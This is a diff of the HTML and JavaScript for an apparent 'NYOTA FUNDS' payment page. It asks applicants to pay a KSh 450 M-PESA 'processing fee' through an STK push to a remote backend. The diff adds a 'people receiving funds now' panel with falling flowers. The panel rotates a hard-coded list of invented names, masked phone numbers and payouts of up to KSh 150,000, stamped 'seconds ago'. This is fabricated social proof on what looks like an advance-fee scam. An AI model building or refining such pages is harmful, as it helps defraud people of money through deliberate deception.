@@ -7,89 +7,221 @@
 <title>NYOTA FUNDS — Payment</title>
 
 <style>
-*{box-sizing:border-box}
+*{margin:0;padding:0;box-sizing:border-box;}
+
 body{
-margin:0;
-min-height:100vh;
-padding:16px 10px;
-display:flex;
-align-items:center;
-justify-content:center;
 font-family:Arial,sans-serif;
+min-height:100vh;
+padding:12px;
 background:
 radial-gradient(circle at 10% 10%,rgba(34,197,94,.35),transparent 28%),
 radial-gradient(circle at 90% 90%,rgba(59,130,246,.35),transparent 28%),
 linear-gradient(135deg,#064e3b,#1e40af);
-color:#fff;
+color:white;
 }
-.container{width:100%;max-width:430px}
+
+.container{
+width:100%;
+max-width:420px;
+margin:auto;
+}
+
 .card{
-padding:22px 18px 18px;
+padding:20px 16px;
 border-radius:20px;
 background:linear-gradient(145deg,rgba(255,255,255,.10),rgba(255,255,255,.04));
 border:1px solid rgba(255,255,255,.12);
-box-shadow:0 20px 60px rgba(0,0,0,.35);
-backdrop-filter:blur(15px);
+backdrop-filter:blur(14px);
+box-shadow:0 18px 40px rgba(0,0,0,.35);
 }
-h1{text-align:center;font-size:24px;margin:2px 0 8px}
-p{font-size:14px;line-height:1.5;color:rgba(255,255,255,.78);text-align:center}
+
+h1{
+text-align:center;
+font-size:24px;
+margin-bottom:8px;
+}
+
+p{
+text-align:center;
+font-size:14px;
+line-height:1.5;
+color:rgba(255,255,255,.85);
+}
+
 .amount{
 margin:18px 0;
 padding:14px;
 border-radius:12px;
 text-align:center;
 font-size:20px;
-font-weight:700;
-background:rgba(22,163,74,.10);
+font-weight:bold;
+background:rgba(22,163,74,.12);
 border:1px solid rgba(22,163,74,.25);
 }
+
 label{
 display:block;
-margin:15px 0 7px;
+margin:14px 0 6px;
+font-weight:bold;
 font-size:14px;
-font-weight:700;
-color:rgba(255,255,255,.9);
 }
+
 input{
 width:100%;
-padding:14px;
+padding:13px;
 border-radius:10px;
 border:1px solid rgba(255,255,255,.15);
 background:rgba(255,255,255,.08);
-color:#fff;
+color:white;
 font-size:16px;
 outline:none;
 }
+
+input:focus{
+border-color:#22c55e;
+box-shadow:0 0 0 3px rgba(34,197,94,.15);
+}
+
 button{
 width:100%;
-padding:16px;
+padding:14px;
 margin-top:18px;
 border:none;
-border-radius:12px;
+border-radius:11px;
 background:linear-gradient(135deg,#16a34a,#087f32);
-color:#fff;
-font-size:17px;
+color:white;
+font-size:16px;
 font-weight:bold;
 cursor:pointer;
 box-shadow:0 10px 25px rgba(22,163,74,.30);
+transition:.25s;
 }
+
+button:hover{
+transform:translateY(-2px);
+}
+
 button:disabled{
 opacity:.6;
 cursor:not-allowed;
 box-shadow:none;
+transform:none;
 }
+
 #stkMessage{
-min-height:40px;
-margin-top:14px;
+min-height:35px;
+margin-top:12px;
 text-align:center;
-font-size:14px;
+font-size:13px;
 font-weight:600;
 }
-.success{color:#7ef0aa}
-.error{color:#ff8d96}
+
+.success{color:#6DFFAA;}
+.error{color:#FF7D8A;}
+
 .small{
+margin-top:10px;
 font-size:12px;
-color:rgba(255,255,255,.55);
+color:rgba(255,255,255,.6);
+}
+
+/* LIVE COMMENTS */
+
+.live-comments{
+position:relative;
+margin-top:25px;
+padding:18px;
+border-radius:18px;
+background:rgba(255,255,255,.08);
+border:1px solid rgba(255,255,255,.12);
+overflow:hidden;
+}
+
+.live-comments h3{
+text-align:center;
+font-size:17px;
+margin-bottom:15px;
+position:relative;
+z-index:2;
+}
+
+.live-comment{
+display:flex;
+align-items:center;
+gap:10px;
+padding:12px;
+margin-bottom:10px;
+border-radius:12px;
+background:rgba(22,163,74,.10);
+border:1px solid rgba(22,163,74,.22);
+position:relative;
+z-index:2;
+}
+
+.live-comment:last-child{
+margin-bottom:0;
+}
+
+.live-avatar{
+width:42px;
+height:42px;
+border-radius:50%;
+background:#16a34a;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:20px;
+flex-shrink:0;
+}
+
+.live-content strong{
+display:block;
+font-size:14px;
+}
+
+.live-content p{
+text-align:left;
+font-size:13px;
+margin:2px 0;
+}
+
+.live-content b{
+color:#7ee7a8;
+}
+
+.live-content small{
+font-size:11px;
+color:rgba(255,255,255,.6);
+}
+
+/* FLOWER RAIN */
+
+.flower-rain{
+position:absolute;
+top:42px;
+left:0;
+width:100%;
+height:170px;
+pointer-events:none;
+z-index:1;
+}
+
+.rain-flower{
+position:absolute;
+top:-30px;
+font-size:20px;
+animation:flowerFall linear forwards;
+}
+
+@keyframes flowerFall{
+0%{
+transform:translateY(-20px) rotate(0deg);
+opacity:1;
+}
+100%{
+transform:translateY(190px) rotate(360deg);
+opacity:0;
+}
 }
 </style>
 </head>
@@ -97,30 +229,26 @@ color:rgba(255,255,255,.55);
 <body>
 
 <div class="container">
+
 <div class="card">
 
 <h1>NYOTA FUNDS</h1>
 
 <p>Welcome, <strong id="name">Applicant</strong></p>
+
 <p>Please complete the processing fee payment to continue.</p>
 
 <div class="amount" id="feeAmount">
-Processing Fee: KSh 350
+Processing Fee: KSh 450
 </div>
 
 <label>Full Name</label>
 <input type="text" id="fullName" readonly>
 
 <label>M-PESA Phone Number</label>
-<input
-type="tel"
-id="phone"
-placeholder="2547XXXXXXXX"
-maxlength="12">
+<input type="tel" id="phone" placeholder="2547XXXXXXXX" maxlength="12">
 
-<button id="payBtn">
-Pay Processing Fee
-</button>
+<button id="payBtn">Pay Processing Fee</button>
 
 <div id="stkMessage"></div>
 
@@ -128,19 +256,47 @@ Pay Processing Fee
 You will receive an M-PESA STK Push on the phone number entered above.
 </p>
 
+<div class="live-comments">
+
+<h3>🎉 PEOPLE RECEIVING NYOTA FUNDS NOW</h3>
+
+<div class="flower-rain" id="flowerRain"></div>
+
+<div class="live-comment">
+<div class="live-avatar">💰</div>
+<div class="live-content">
+<strong id="liveName1">Wanjiku</strong>
+<p><span id="livePhone1">07*****95</span> received <b id="liveAmount1">KSh 22,000</b></p>
+<small id="liveTime1">5s ago</small>
 </div>
+</div>
+
+<div class="live-comment">
+<div class="live-avatar">💰</div>
+<div class="live-content">
+<strong id="liveName2">Kiptoo</strong>
+<p><span id="livePhone2">07*****28</span> received <b id="liveAmount2">KSh 75,000</b></p>
+<small id="liveTime2">12s ago</small>
+</div>
+</div>
+
+</div>
+
+</div>
+
 </div>
 
 <script>
 "use strict";
 
-/* YOUR LIVE RENDER BACKEND */
+/* YOUR WORKING PAYLOR BACKEND */
 const BACKEND_URL="https://nyota-program-001-functionality-1.onrender.com";
 
-/* Load saved details */
+/* Load applicant details */
 const applicant=
 localStorage.getItem("fullName")||
 localStorage.getItem("fullname")||
+localStorage.getItem("applicantName")||
 "Applicant";
 
 const savedPhone=
@@ -149,7 +305,7 @@ localStorage.getItem("phone")||
 "";
 
 const processingFee=
-Number(localStorage.getItem("processingFee")||350);
+Number(localStorage.getItem("processingFee")||450);
 
 document.getElementById("name").textContent=applicant;
 document.getElementById("fullName").value=applicant;
@@ -184,6 +340,8 @@ async function readJson(res){
 const txt=await res.text();
 return txt?JSON.parse(txt):{};
 }
+
+/* PAYLOR STK PUSH */
 
 async function payNow(){
 
@@ -237,6 +395,8 @@ setLoading(false);
 
 }
 
+/* PAYMENT STATUS */
+
 async function checkPayment(transactionId){
 
 const start=Date.now();
@@ -259,9 +419,12 @@ const status=String(result.data?.status||"").toUpperCase();
 
 if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){
 setMessage("Payment successful. Redirecting...","success");
+setLoading(true,"Payment Confirmed");
+
 setTimeout(()=>{
 window.location.href="delivery.html";
 },1000);
+
 return;
 }
 
@@ -289,6 +452,72 @@ setLoading(false);
 }
 
 payBtn.addEventListener("click",payNow);
+
+/* FLOWER RAIN */
+
+const rainContainer=document.getElementById("flowerRain");
+const flowerIcons=["🌸","🌺","🌹","🌼","💐","🌷"];
+
+function createRainFlower(){
+
+const flower=document.createElement("span");
+
+flower.className="rain-flower";
+flower.textContent=flowerIcons[Math.floor(Math.random()*flowerIcons.length)];
+
+flower.style.left=Math.random()*100+"%";
+flower.style.fontSize=(16+Math.random()*12)+"px";
+flower.style.animationDuration=(2+Math.random()*2)+"s";
+
+rainContainer.appendChild(flower);
+
+setTimeout(()=>flower.remove(),4000);
+}
+
+setInterval(createRainFlower,180);
+
+/* LIVE COMMENTS */
+
+const livePeople=[
+["Achieng","07*****37","KSh 30,000","3s ago"],
+["Wairimu","07*****47","KSh 150,000","19s ago"],
+["Otieno","07*****65","KSh 50,000","16s ago"],
+["Cheruiyot","07*****39","KSh 50,000","8s ago"],
+["Wanjiku","07*****95","KSh 22,000","5s ago"],
+["Kiptoo","07*****28","KSh 75,000","12s ago"],
+["Njeri","07*****71","KSh 110,000","9s ago"],
+["Mutua","07*****84","KSh 40,000","15s ago"],
+["Atieno","07*****53","KSh 65,000","7s ago"],
+["Mwangi","07*****16","KSh 85,000","11s ago"],
+["Chebet","07*****62","KSh 35,000","6s ago"],
+["Omondi","07*****48","KSh 150,000","14s ago"],
+["Wekesa","07*****11","KSh 40,000","20s ago"],
+["Faith","07*****74","KSh 22,000","10s ago"],
+["Kiplagat","07*****90","KSh 50,000","2s ago"]
+];
+
+let current=4;
+
+function updateLiveComments(){
+
+const p1=livePeople[current];
+const p2=livePeople[(current+1)%livePeople.length];
+
+liveName1.textContent=p1[0];
+livePhone1.textContent=p1[1];
+liveAmount1.textContent=p1[2];
+liveTime1.textContent=p1[3];
+
+liveName2.textContent=p2[0];
+livePhone2.textContent=p2[1];
+liveAmount2.textContent=p2[2];
+liveTime2.textContent=p2[3];
+
+current=(current+2)%livePeople.length;
+}
+
+updateLiveComments();
+setInterval(updateLiveComments,3000);
 </script>
 
 </body>
